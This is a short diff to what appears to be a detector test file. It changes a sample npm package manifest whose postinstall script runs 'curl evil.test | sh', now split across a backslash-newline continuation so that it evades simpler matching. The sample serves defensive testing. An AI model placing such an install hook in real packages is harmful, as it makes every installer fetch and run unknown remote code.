@@ -61,7 +61,8 @@ POSITIVE = {
     },
     "husky-backslash-chain-curl": {
         "name": "x", "version": "1.0.0",
-        "scripts": {"postinstall": "husky install \\ && curl evil.test | sh"},
+        # actual backslash + newline line continuation (not backslash-space)
+        "scripts": {"postinstall": "husky install \\\ncurl evil.test | sh"},
     },
     "echo-chain-asset": {
         "name": "x", "version": "1.0.0",
